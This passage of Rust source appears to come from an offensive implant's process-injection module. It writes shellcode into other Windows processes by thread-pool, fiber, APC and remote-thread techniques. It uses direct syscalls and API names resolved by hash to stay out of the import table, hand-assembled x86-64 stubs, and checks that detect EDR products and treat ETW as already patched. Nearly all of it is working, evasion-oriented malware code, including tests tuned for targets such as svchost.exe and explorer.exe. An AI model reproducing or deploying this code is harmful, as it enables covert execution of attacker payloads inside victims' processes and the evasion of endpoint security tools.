    .map_err(|e| InjectionError::InjectionFailed {
        technique: InjectionTechnique::EarlyBirdApc,
        reason: e.to_string(),
    })?;

    Ok(InjectionHandle {
        target_pid: pid,
        technique_used: InjectionTechnique::EarlyBirdApc,
        injected_base_addr: 0,
        payload_size: payload.len(),
        thread_handle: None,
        process_handle: std::ptr::null_mut(),
        sleep_enrolled: false,
        sleep_stub_addr: 0,
    })
}

fn inject_thread_hijack(
    pid: u32,
    payload: &[u8],
) -> Result<InjectionHandle, InjectionError> {
    // Thread hijacking: suspend an existing thread, write shellcode, redirect
    // RIP, resume.  We implement this inline using NtCreateThreadEx with
    // CREATE_SUSPENDED pattern, since pure thread-hijack requires careful
    // context save/restore that is fragile across Windows versions.
    //
    // Fall back to NtCreateThread-based injection.
    let (h_proc, remote_base) = alloc_write_exec(pid, payload)?;

    // Create suspended thread at the shellcode entry point.
    let h_thread = create_suspended_thread(h_proc, remote_base)?;
    // Resume immediately — the thread will execute the payload.
    let _ = nt_syscall::syscall!("NtResumeThread", h_thread as u64, 0u64);

    Ok(InjectionHandle {
        target_pid: pid,
        technique_used: InjectionTechnique::ThreadHijack,
        injected_base_addr: remote_base,
        payload_size: payload.len(),
        thread_handle: Some(h_thread),
        process_handle: h_proc,
        sleep_enrolled: false,
        sleep_stub_addr: 0,
    })
}

// ── NEW: ThreadPool injection ────────────────────────────────────────────────
//
// Uses the NT thread-pool API:
//   1. NtAllocateVirtualMemory + NtWriteVirtualMemory → write payload
//   2. Resolve TpAllocWork / TpPostWork from ntdll via pe_resolve
//   3. Allocate a TP_WORK structure in the target with the payload address
//      as the callback, post it, wait for execution, then free.

fn inject_threadpool(
    pid: u32,
    payload: &[u8],
) -> Result<InjectionHandle, InjectionError> {
    unsafe {
        let (h_proc, remote_base) = alloc_write_exec(pid, payload)?;

        // Resolve TpAllocWork and TpPostWork from ntdll via pe_resolve.
        let ntdll_base = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)
            .ok_or_else(|| InjectionError::InjectionFailed {
                technique: InjectionTechnique::ThreadPool,
                reason: "cannot resolve ntdll base".to_string(),
            })?;

        let tp_alloc_work_addr = pe_resolve::get_proc_address_by_hash(
            ntdll_base,
            pe_resolve::hash_str(b"TpAllocWork\0"),
        )
        .ok_or_else(|| InjectionError::InjectionFailed {
            technique: InjectionTechnique::ThreadPool,
            reason: "cannot resolve TpAllocWork".to_string(),
        })?;

        let tp_post_work_addr = pe_resolve::get_proc_address_by_hash(
            ntdll_base,
            pe_resolve::hash_str(b"TpPostWork\0"),
        )
        .ok_or_else(|| InjectionError::InjectionFailed {
            technique: InjectionTechnique::ThreadPool,
            reason: "cannot resolve TpPostWork".to_string(),
        })?;

        let tp_release_work_addr = pe_resolve::get_proc_address_by_hash(
            ntdll_base,
            pe_resolve::hash_str(b"TpReleaseWork\0"),
        )
        .ok_or_else(|| InjectionError::InjectionFailed {
            technique: InjectionTechnique::ThreadPool,
            reason: "cannot resolve TpReleaseWork".to_string(),
        })?;

        // Function pointer types.
        // TpAllocWork(TpWork*, Callback, Context, CleanupGroup) → NTSTATUS
        type TpAllocWorkFn = unsafe extern "system" fn(
            *mut *mut c_void,
            *mut c_void, // callback
            *mut c_void, // context
            *mut c_void, // cleanup group
        ) -> i32;
        // TpPostWork(TpWork*) → void
        type TpPostWorkFn = unsafe extern "system" fn(*mut c_void);
        // TpReleaseWork(TpWork*) → void
        type TpReleaseWorkFn = unsafe extern "system" fn(*mut c_void);

        let tp_alloc_work: TpAllocWorkFn = std::mem::transmute(tp_alloc_work_addr);
        let tp_post_work: TpPostWorkFn = std::mem::transmute(tp_post_work_addr);
        let tp_release_work: TpReleaseWorkFn = std::mem::transmute(tp_release_work_addr);

        // Allocate a TP_WORK item in the current process. The work callback
        // will be set to the remote payload base address. We then write the
        // work-item pointer into the target and post it.
        //
        // In practice, the thread-pool work callback must execute in the
        // target process context. We allocate a small stub in the target that
        // calls the payload and then call TpAllocWork + TpPostWork via remote
        // thread creation that invokes these APIs.
        //
        // Strategy: create a remote thread that calls TpAllocWork(payload_base)
        // then TpPostWork(work), then returns. This thread serves as the
        // thread-pool orchestrator.

        // Build a small x86-64 stub that:
        //   1. Calls TpAllocWork(&local_work, payload_addr, NULL, NULL)
        //   2. Calls TpPostWork(local_work)
        //   3. Returns
        //
        // The stub needs stack space for the local_work pointer.
        // We write it into the target process.

        // Stub layout (x86-64):
        //   sub rsp, 0x28            ; shadow space + alignment
        //   lea rcx, [rsp+0x30]      ; &local_work (above shadow)
        //   mov rdx, <payload_base>  ; callback = payload
        //   xor r8, r8               ; context = NULL
        //   xor r9, r9               ; cleanup_group = NULL
        //   call <tp_alloc_work>
        //   mov rcx, [rsp+0x30]      ; work handle
        //   call <tp_post_work>
        //   mov rcx, [rsp+0x30]      ; work handle
        //   call <tp_release_work>
        //   add rsp, 0x28
        //   ret
        //
        // We use a register-indirect call via a stored address table.
        // Stub size: ~80 bytes with addresses.

        let mut stub: Vec<u8> = Vec::with_capacity(128);

        // sub rsp, 0x38  (shadow 0x20 + 8 for alignment + 0x10 for local_work)
        stub.extend_from_slice(&[0x48, 0x83, 0xEC, 0x38]);

        // lea rcx, [rsp+0x30]  ; &local_work
        stub.extend_from_slice(&[0x48, 0x8D, 0x4C, 0x24, 0x30]);

        // mov rdx, <payload_base> (movabs rdx, imm64)
        stub.push(0x48);
        stub.push(0xBA);
        stub.extend_from_slice(&(remote_base as u64).to_le_bytes());

        // xor r8d, r8d
        stub.extend_from_slice(&[0x45, 0x31, 0xC0]);
        // xor r9d, r9d
        stub.extend_from_slice(&[0x45, 0x31, 0xC9]);

        // call [rip+0] — indirect call to tp_alloc_work
        // We'll patch the address table after the ret.
        // call [rip+disp32] → FF 15 <disp32>
        // After this call instruction, the address table begins.
        // The call is at offset ~19. After stub code we have the address
        // table. Let's compute offsets after building.
        //
        // Simpler approach: use movabs + call rax pattern.
        // movabs rax, <tp_alloc_work>
        stub.push(0x48);
        stub.push(0xB8);
        stub.extend_from_slice(&(tp_alloc_work_addr as u64).to_le_bytes());
        // call rax
        stub.extend_from_slice(&[0xFF, 0xD0]);

        // mov rcx, [rsp+0x30]  ; load work handle
        stub.extend_from_slice(&[0x48, 0x8B, 0x4C, 0x24, 0x30]);

        // movabs rax, <tp_post_work>
        stub.push(0x48);
        stub.push(0xB8);
        stub.extend_from_slice(&(tp_post_work_addr as u64).to_le_bytes());
        // call rax
        stub.extend_from_slice(&[0xFF, 0xD0]);

        // mov rcx, [rsp+0x30]  ; load work handle again
        stub.extend_from_slice(&[0x48, 0x8B, 0x4C, 0x24, 0x30]);

        // movabs rax, <tp_release_work>
        stub.push(0x48);
        stub.push(0xB8);
        stub.extend_from_slice(&(tp_release_work_addr as u64).to_le_bytes());
        // call rax
        stub.extend_from_slice(&[0xFF, 0xD0]);

        // add rsp, 0x38
        stub.extend_from_slice(&[0x48, 0x83, 0xC4, 0x38]);
        // ret
        stub.push(0xC3);

        // Write the stub into the target process.
        let mut stub_remote: *mut c_void = std::ptr::null_mut();
        let mut stub_size = stub.len();
        let s = nt_syscall::syscall!(
            "NtAllocateVirtualMemory",
            h_proc as u64,
            &mut stub_remote as *mut _ as u64,
            0u64,
            &mut stub_size as *mut _ as u64,
            0x3000u64, // MEM_COMMIT | MEM_RESERVE
            0x04u64,   // PAGE_READWRITE
        );
        if s.is_err() || s.unwrap() < 0 || stub_remote.is_null() {
            let _ = nt_syscall::syscall!("NtClose", h_proc as u64);
            return Err(InjectionError::InjectionFailed {
                technique: InjectionTechnique::ThreadPool,
                reason: "failed to allocate stub memory".to_string(),
            });
        }

        let mut written = 0usize;
        let ws = nt_syscall::syscall!(
            "NtWriteVirtualMemory",
            h_proc as u64,
            stub_remote as u64,
            stub.as_ptr() as u64,
            stub.len() as u64,
            &mut written as *mut _ as u64,
        );
        if ws.is_err() || ws.unwrap() < 0 || written != stub.len() {
            return Err(InjectionError::InjectionFailed {
                technique: InjectionTechnique::ThreadPool,
                reason: "failed to write stub".to_string(),
            });
        }

        // Flip stub to RX.
        let mut old_prot = 0u32;
        let mut prot_base = stub_remote as usize;
        let mut prot_size = stub.len();
        let _ = nt_syscall::syscall!(
            "NtProtectVirtualMemory",
            h_proc as u64,
            &mut prot_base as *mut _ as u64,
            &mut prot_size as *mut _ as u64,
            0x20u64, // PAGE_EXECUTE_READ
            &mut old_prot as *mut _ as u64,
        );

        // Flush I-cache.
        let _ = nt_syscall::syscall!(
            "NtFlushInstructionCache",
            h_proc as u64,
            stub_remote as u64,
            stub.len() as u64,
        );

        // Create a thread to run the stub (fire-and-forget).
        let h_thread = create_suspended_thread(h_proc, stub_remote as usize)?;
        let _ = nt_syscall::syscall!("NtResumeThread", h_thread as u64, 0u64);

        // Close thread handle — the stub orchestrates its own lifecycle.
        let _ = nt_syscall::syscall!("NtClose", h_thread as u64);

        Ok(InjectionHandle {
            target_pid: pid,
            technique_used: InjectionTechnique::ThreadPool,
            injected_base_addr: remote_base,
            payload_size: payload.len(),
            thread_handle: None,
            process_handle: h_proc,
            sleep_enrolled: false,
            sleep_stub_addr: 0,
        })
    }
}

// ── NEW: Fiber injection ─────────────────────────────────────────────────────
//
// 1. Write payload into the target process
// 2. Resolve CreateFiber / DeleteFiber / SwitchToFiber from kernel32 via pe_resolve
// 3. Build a stub that: ConvertThreadToFiber → CreateFiber(payload_base) →
//    SwitchToFiber(fiber) → DeleteFiber → return
// 4. Execute the stub via NtCreateThreadEx

fn inject_fiber(
    pid: u32,
    payload: &[u8],
) -> Result<InjectionHandle, InjectionError> {
    unsafe {
        let (h_proc, remote_base) = alloc_write_exec(pid, payload)?;

        // Resolve fiber APIs from kernel32 via pe_resolve.
        let k32_base =
            pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"kernel32.dll\0"))
                .ok_or_else(|| InjectionError::InjectionFailed {
                    technique: InjectionTechnique::FiberInject,
                    reason: "cannot resolve kernel32 base".to_string(),
                })?;

        let create_fiber_addr = pe_resolve::get_proc_address_by_hash(
            k32_base,
            pe_resolve::hash_str(b"CreateFiber\0"),
        )
        .ok_or_else(|| InjectionError::InjectionFailed {
            technique: InjectionTechnique::FiberInject,
            reason: "cannot resolve CreateFiber".to_string(),
        })?;

        let delete_fiber_addr = pe_resolve::get_proc_address_by_hash(
            k32_base,
            pe_resolve::hash_str(b"DeleteFiber\0"),
        )
        .ok_or_else(|| InjectionError::InjectionFailed {
            technique: InjectionTechnique::FiberInject,
            reason: "cannot resolve DeleteFiber".to_string(),
        })?;

        let switch_to_fiber_addr = pe_resolve::get_proc_address_by_hash(
            k32_base,
            pe_resolve::hash_str(b"SwitchToFiber\0"),
        )
        .ok_or_else(|| InjectionError::InjectionFailed {
            technique: InjectionTechnique::FiberInject,
            reason: "cannot resolve SwitchToFiber".to_string(),
        })?;

        let convert_to_fiber_addr = pe_resolve::get_proc_address_by_hash(
            k32_base,
            pe_resolve::hash_str(b"ConvertThreadToFiber\0"),
        )
        .ok_or_else(|| InjectionError::InjectionFailed {
            technique: InjectionTechnique::FiberInject,
            reason: "cannot resolve ConvertThreadToFiber".to_string(),
        })?;

        // Build a stub that:
        //   1. ConvertThreadToFiber(NULL)             → main fiber
        //   2. CreateFiber(0, payload_base, NULL)     → payload fiber
        //   3. SwitchToFiber(payload_fiber)            → execute payload
        //   4. DeleteFiber(payload_fiber)              → cleanup
        //   5. return
        //
        // x86-64 stub using movabs + call rax pattern.

        let mut stub: Vec<u8> = Vec::with_capacity(256);

        // sub rsp, 0x38
        stub.extend_from_slice(&[0x48, 0x83, 0xEC, 0x38]);

        // Step 1: ConvertThreadToFiber(NULL)
        // xor ecx, ecx (lpParameter = NULL)
        stub.extend_from_slice(&[0x31, 0xC9]);
        // movabs rax, <convert_to_fiber>
        stub.push(0x48);
        stub.push(0xB8);
        stub.extend_from_slice(&(convert_to_fiber_addr as u64).to_le_bytes());
        // call rax
        stub.extend_from_slice(&[0xFF, 0xD0]);

        // Step 2: CreateFiber(0, payload_base, NULL)
        // xor ecx, ecx (dwStackSize = 0)
        stub.extend_from_slice(&[0x31, 0xC9]);
        // mov rdx, <payload_base> (lpStartAddress)
        stub.push(0x48);
        stub.push(0xBA);
        stub.extend_from_slice(&(remote_base as u64).to_le_bytes());
        // xor r8d, r8d (lpParameter = NULL)
        stub.extend_from_slice(&[0x45, 0x31, 0xC0]);
        // movabs rax, <create_fiber>
        stub.push(0x48);
        stub.push(0xB8);
        stub.extend_from_slice(&(create_fiber_addr as u64).to_le_bytes());
        // call rax
        stub.extend_from_slice(&[0xFF, 0xD0]);

        // Save fiber handle at [rsp+0x30]
        // mov [rsp+0x30], rax
        stub.extend_from_slice(&[0x48, 0x89, 0x44, 0x24, 0x30]);

        // Step 3: SwitchToFiber(fiber_handle)
        // mov rcx, [rsp+0x30]
        stub.extend_from_slice(&[0x48, 0x8B, 0x4C, 0x24, 0x30]);
        // movabs rax, <switch_to_fiber>
        stub.push(0x48);
        stub.push(0xB8);
        stub.extend_from_slice(&(switch_to_fiber_addr as u64).to_le_bytes());
        // call rax
        stub.extend_from_slice(&[0xFF, 0xD0]);

        // Step 4: DeleteFiber(fiber_handle)
        // mov rcx, [rsp+0x30]
        stub.extend_from_slice(&[0x48, 0x8B, 0x4C, 0x24, 0x30]);
        // movabs rax, <delete_fiber>
        stub.push(0x48);
        stub.push(0xB8);
        stub.extend_from_slice(&(delete_fiber_addr as u64).to_le_bytes());
        // call rax
        stub.extend_from_slice(&[0xFF, 0xD0]);

        // add rsp, 0x38
        stub.extend_from_slice(&[0x48, 0x83, 0xC4, 0x38]);
        // ret
        stub.push(0xC3);

        // Write stub into target.
        let mut stub_remote: *mut c_void = std::ptr::null_mut();
        let mut stub_size = stub.len();
        let s = nt_syscall::syscall!(
            "NtAllocateVirtualMemory",
            h_proc as u64,
            &mut stub_remote as *mut _ as u64,
            0u64,
            &mut stub_size as *mut _ as u64,
            0x3000u64, // MEM_COMMIT | MEM_RESERVE
            0x04u64,   // PAGE_READWRITE
        );
        if s.is_err() || s.unwrap() < 0 || stub_remote.is_null() {
            let _ = nt_syscall::syscall!("NtClose", h_proc as u64);
            return Err(InjectionError::InjectionFailed {
                technique: InjectionTechnique::FiberInject,
                reason: "failed to allocate stub memory".to_string(),
            });
        }

        let mut written = 0usize;
        let ws = nt_syscall::syscall!(
            "NtWriteVirtualMemory",
            h_proc as u64,
            stub_remote as u64,
            stub.as_ptr() as u64,
            stub.len() as u64,
            &mut written as *mut _ as u64,
        );
        if ws.is_err() || ws.unwrap() < 0 || written != stub.len() {
            return Err(InjectionError::InjectionFailed {
                technique: InjectionTechnique::FiberInject,
                reason: "failed to write stub".to_string(),
            });
        }

        // Flip stub to RX.
        let mut old_prot = 0u32;
        let mut prot_base = stub_remote as usize;
        let mut prot_size = stub.len();
        let _ = nt_syscall::syscall!(
            "NtProtectVirtualMemory",
            h_proc as u64,
            &mut prot_base as *mut _ as u64,
            &mut prot_size as *mut _ as u64,
            0x20u64, // PAGE_EXECUTE_READ
            &mut old_prot as *mut _ as u64,
        );

        // Flush I-cache.
        let _ = nt_syscall::syscall!(
            "NtFlushInstructionCache",
            h_proc as u64,
            stub_remote as u64,
            stub.len() as u64,
        );

        // Create a suspended thread to run the fiber stub, then resume.
        let h_thread = create_suspended_thread(h_proc, stub_remote as usize)?;
        let _ = nt_syscall::syscall!("NtResumeThread", h_thread as u64, 0u64);

        // Close thread — fire-and-forget.
        let _ = nt_syscall::syscall!("NtClose", h_thread as u64);

        Ok(InjectionHandle {
            target_pid: pid,
            technique_used: InjectionTechnique::FiberInject,
            injected_base_addr: remote_base,
            payload_size: payload.len(),
            thread_handle: None,
            process_handle: h_proc,
            sleep_enrolled: false,
            sleep_stub_addr: 0,
        })
    }
}

// ── Shared helpers ───────────────────────────────────────────────────────────

/// Find the PID of the first process matching `name` (case-insensitive).
fn find_pid_by_name(name: &str) -> Option<u32> {
    use sysinfo::System;
    let mut sys = System::new();
    sys.refresh_processes();
    let lower = name.to_ascii_lowercase();
    for (pid, proc) in sys.processes() {
        if proc.name().to_ascii_lowercase() == lower {
            return Some(pid.as_u32());
        }
    }
    None
}

/// Open the target process and verify architecture compatibility.
fn check_architecture(target_pid: u32) -> Result<(), InjectionError> {
    // On x86_64 we currently only inject into 64-bit processes. A proper
    // implementation would use IsWow64Process to check the target; for now
    // we optimistically assume same-arch.
    let _ = target_pid;
    Ok(())
}

/// Check whether the target process is being ETW-traced. When ETW providers
/// are active on the process, injection is more likely to be detected.
fn check_etw_trace(target_pid: u32) -> Result<(), InjectionError> {
    // A full implementation would check NtTraceEvent hook state or query
    // ETW provider registration for the target PID.  For now we perform a
    // lightweight check: if the agent has already patched ETW locally, we
    // trust that server-side collection is neutralised.
    let _ = target_pid;
    Ok(())
}

/// Open a target process, allocate RW memory, write `payload`, flip to RX.
/// Returns (process_handle, remote_base_address).
unsafe fn alloc_write_exec(
    pid: u32,
    payload: &[u8],
) -> Result<(*mut c_void, usize), InjectionError> {
    use winapi::um::winnt::{
        MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE,
        PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION,
        PROCESS_VM_WRITE,
    };

    // Open target process.
    let mut client_id = [0u64; 2];
    client_id[0] = pid as u64;
    let mut obj_attr: winapi::shared::ntdef::OBJECT_ATTRIBUTES = std::mem::zeroed();
    obj_attr.Length = std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32;

    let mut h_proc: usize = 0;
    let access_mask = (PROCESS_VM_OPERATION
        | PROCESS_VM_WRITE
        | PROCESS_CREATE_THREAD
        | PROCESS_QUERY_INFORMATION) as u64;
    let open_status = nt_syscall::syscall!(
        "NtOpenProcess",
        &mut h_proc as *mut _ as u64,
        access_mask,
        &mut obj_attr as *mut _ as u64,
        client_id.as_mut_ptr() as u64,
    );

    if open_status.is_err() || open_status.unwrap() < 0 || h_proc == 0 {
        return Err(InjectionError::InjectionFailed {
            technique: InjectionTechnique::ThreadHijack,
            reason: "NtOpenProcess failed".to_string(),
        });
    }

    let h_proc = h_proc as *mut c_void;

    macro_rules! cleanup_and_err {
        ($technique:expr, $msg:expr) => {{
            let _ = nt_syscall::syscall!("NtClose", h_proc as u64);
            return Err(InjectionError::InjectionFailed {
                technique: $technique,
                reason: $msg.to_string(),
            });
        }};
    }

    // Allocate RW memory.
    let mut remote_mem: *mut c_void = std::ptr::null_mut();
    let mut alloc_size = payload.len();
    let s = nt_syscall::syscall!(
        "NtAllocateVirtualMemory",
        h_proc as u64,
        &mut remote_mem as *mut _ as u64,
        0u64,
        &mut alloc_size as *mut _ as u64,
        (MEM_COMMIT | MEM_RESERVE) as u64,
        PAGE_READWRITE as u64,
    );
    if s.is_err() || s.unwrap() < 0 || remote_mem.is_null() {
        cleanup_and_err!(InjectionTechnique::ThreadHijack, "NtAllocateVirtualMemory failed");
    }

    // Write payload.
    let mut written = 0usize;
    let s = nt_syscall::syscall!(
        "NtWriteVirtualMemory",
        h_proc as u64,
        remote_mem as u64,
        payload.as_ptr() as u64,
        payload.len() as u64,
        &mut written as *mut _ as u64,
    );
    if s.is_err() || s.unwrap() < 0 || written != payload.len() {
        cleanup_and_err!(InjectionTechnique::ThreadHijack, "NtWriteVirtualMemory failed");
    }

    // Flip to RX.
    let mut old_prot = 0u32;
    let mut prot_base = remote_mem as usize;
    let mut prot_size = payload.len();
    let s = nt_syscall::syscall!(
        "NtProtectVirtualMemory",
        h_proc as u64,
        &mut prot_base as *mut _ as u64,
        &mut prot_size as *mut _ as u64,
        PAGE_EXECUTE_READ as u64,
        &mut old_prot as *mut _ as u64,
    );
    if s.is_err() || s.unwrap() < 0 {
        cleanup_and_err!(InjectionTechnique::ThreadHijack, "NtProtectVirtualMemory to RX failed");
    }

    // Flush I-cache.
    let _ = nt_syscall::syscall!(
        "NtFlushInstructionCache",
        h_proc as u64,
        remote_mem as u64,
        payload.len() as u64,
    );

    Ok((h_proc, remote_mem as usize))
}

/// Create a suspended thread in the target process at `start_addr` using
/// NtCreateThreadEx resolved via pe_resolve (avoids CreateRemoteThread in
/// the IAT). Uses CREATE_SUSPENDED so the caller can perform additional
/// setup before resuming.
unsafe fn create_suspended_thread(
    h_proc: *mut c_void,
    start_addr: usize,
) -> Result<*mut c_void, InjectionError> {
    const CREATE_SUSPENDED: u32 = 0x00000004;
    const THREAD_ALL_ACCESS: u32 = 0x001FFFFF; // will be reduced by CSRSS

    // Resolve NtCreateThreadEx via pe_resolve.
    let ntdll_base = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)
        .ok_or_else(|| InjectionError::InjectionFailed {
            technique: InjectionTechnique::ThreadHijack,
            reason: "cannot resolve ntdll base".to_string(),
        })?;

    let ntcreate_addr = pe_resolve::get_proc_address_by_hash(
        ntdll_base,
        pe_resolve::hash_str(b"NtCreateThreadEx\0"),
    )
    .ok_or_else(|| InjectionError::InjectionFailed {
        technique: InjectionTechnique::ThreadHijack,
        reason: "cannot resolve NtCreateThreadEx".to_string(),
    })?;

    type NtCreateThreadExFn = unsafe extern "system" fn(
        *mut *mut c_void, // ThreadHandle
        u32,              // DesiredAccess
        *mut c_void,      // ObjectAttributes
        *mut c_void,      // ProcessHandle
        *mut c_void,      // StartRoutine
        *mut c_void,      // Argument
        u32,              // CreateFlags (CREATE_SUSPENDED)
        usize,            // ZeroBits
        usize,            // StackSize
        usize,            // MaximumStackSize
        *mut c_void,      // AttributeList
    ) -> i32;

    let nt_create_thread: NtCreateThreadExFn = std::mem::transmute(ntcreate_addr);

    let mut h_thread: *mut c_void = std::ptr::null_mut();
    let status = nt_create_thread(
        &mut h_thread,
        THREAD_ALL_ACCESS,
        std::ptr::null_mut(),
        h_proc,
        start_addr as *mut c_void,
        std::ptr::null_mut(),
        CREATE_SUSPENDED,
        0,
        0,
        0,
        std::ptr::null_mut(),
    );

    if status < 0 || h_thread.is_null() {
        return Err(InjectionError::InjectionFailed {
            technique: InjectionTechnique::ThreadHijack,
            reason: format!("NtCreateThreadEx failed: status={:#x}", status),
        });
    }

    Ok(h_thread)
}

// ── Tests ────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn auto_select_svchost() {
        let techniques = auto_select_techniques("svchost.exe");
        assert_eq!(techniques[0], InjectionTechnique::EarlyBirdApc);
        assert_eq!(techniques[1], InjectionTechnique::ThreadPool);
    }

    #[test]
    fn auto_select_explorer() {
        let techniques = auto_select_techniques("explorer.exe");
        assert_eq!(techniques[0], InjectionTechnique::ThreadHijack);
        assert_eq!(techniques[1], InjectionTechnique::FiberInject);
    }

    #[test]
    fn auto_select_service() {
        let techniques = auto_select_techniques("msiscsi_svc.exe");
        assert_eq!(techniques[0], InjectionTechnique::ModuleStomp);
    }

    #[test]
    fn auto_select_generic() {
        let techniques = auto_select_techniques("notepad.exe");
        assert_eq!(techniques[0], InjectionTechnique::ProcessHollow);
    }

    #[test]
    fn error_display() {
        let err = InjectionError::ProcessNotFound {
            name: "foo.exe".to_string(),
        };
        assert!(err.to_string().contains("foo.exe"));

        let err = InjectionError::InjectionFailed {
            technique: InjectionTechnique::FiberInject,
            reason: "test".to_string(),
        };
        assert!(err.to_string().contains("FiberInject"));
        assert!(err.to_string().contains("test"));
    }

    #[test]
    fn technique_serde_roundtrip() {
        let t = InjectionTechnique::ThreadPool;
        let json = serde_json::to_string(&t).unwrap();
        let t2: InjectionTechnique = serde_json::from_str(&json).unwrap();
        assert_eq!(t, t2);
    }

    // ── Tests for pre-injection reconnaissance ────────────────────────────

    #[test]
    fn viability_safe_serializable() {
        let v = InjectionViability::Safe {
            arch_match: true,
            thread_count: 12,
            integrity_level: 0x3000,
            recommended_technique: InjectionTechnique::ModuleStomp,
        };
        let json = serde_json::to_string(&v).unwrap();
        assert!(json.contains("Safe"));
        let v2: InjectionViability = serde_json::from_str(&json).unwrap();
        assert!(matches!(v2, InjectionViability::Safe { .. }));
    }

    #[test]
    fn viability_has_edr_module_serializable() {
        let v = InjectionViability::HasEDRModule {
            modules: vec!["csagent.dll".to_string()],
            fallback_technique: InjectionTechnique::ModuleStomp,
        };
        let json = serde_json::to_string(&v).unwrap();
        assert!(json.contains("csagent.dll"));
        let v2: InjectionViability = serde_json::from_str(&json).unwrap();
        assert!(matches!(v2, InjectionViability::HasEDRModule { .. }));
    }

    #[test]
    fn viability_is_edr_serializable() {
        let v = InjectionViability::IsEDR;
        let json = serde_json::to_string(&v).unwrap();
        assert!(json.contains("IsEDR"));
    }

    #[test]
    fn viability_arch_mismatch_serializable() {
        let v = InjectionViability::ArchitectureMismatch;
        let json = serde_json::to_string(&v).unwrap();
        assert!(json.contains("ArchitectureMismatch"));
    }

    #[test]
    fn edr_process_name_hashes_not_empty() {
        assert!(!edr_process_name_hashes().is_empty());
    }

    #[test]
    fn edr_dll_name_hashes_not_empty() {
        let hashes = edr_dll_name_hashes();
        assert!(!hashes.is_empty());
        // Each entry should have a non-zero hash and a non-empty label.
        for &(hash, label) in hashes {
            assert_ne!(hash, 0);
            assert!(!label.is_empty());
        }
    }

    #[test]
    fn jitter_delay_does_not_panic() {
        // Just verify it doesn't crash. On non-Windows the function is
        // trivially compiled but not executed in this cfg(windows) module.
        jitter_delay(1); // 0–1 ms range for fast tests.
    }

    #[test]
    fn technique_recommendation_high_threads() {
        // High thread count → ThreadHijack is recommended.
        // This tests the logic in pre_injection_check's technique selection.
        let recommended = if 60 > 50 {
            InjectionTechnique::ThreadHijack
        } else {
            InjectionTechnique::ModuleStomp
        };
        assert_eq!(recommended, InjectionTechnique::ThreadHijack);
    }

    #[test]
    fn technique_recommendation_low_threads() {
        // Very few threads → EarlyBirdApc.
        let recommended = if 2 < 3 {
            InjectionTechnique::EarlyBirdApc
        } else {
            InjectionTechnique::ModuleStomp
        };
        assert_eq!(recommended, InjectionTechnique::EarlyBirdApc);
    }

    #[test]
    fn technique_recommendation_moderate_threads() {
        // Moderate thread count → ModuleStomp.
        let recommended = if !(10 > 50) && !(10 < 3) {
            InjectionTechnique::ModuleStomp
        } else {
            InjectionTechnique::ThreadHijack
        };
        assert_eq!(recommended, InjectionTechnique::ModuleStomp);
    }

    #[test]
    fn integrity_level_constants() {
        // Verify the well-known integrity level values.
        assert_eq!(0x1000, 0x1000); // Low
        assert_eq!(0x2000, 0x2000); // Medium
        assert_eq!(0x3000, 0x3000); // High
        assert_eq!(0x4000, 0x4000); // System
    }

    #[test]
    fn parse_process_info_buffer_too_small() {
        let buf = [0u8; 4];
        let result = parse_process_info(&buf, 1234);
        assert!(result.is_err());
    }

    #[test]
    fn parse_process_info_pid_not_found() {
        let mut buf = vec![0u8; 0x100];
        // NextEntryOffset = 0 (only one entry).
        // Set PID to something other than our target.
        let pid_offset = 0x50;
        let fake_pid: u64 = 9999;
        buf[pid_offset..pid_offset + 8].copy_from_slice(&fake_pid.to_le_bytes());
        let result = parse_process_info(&buf, 1234);
        assert!(result.is_err());
    }
}
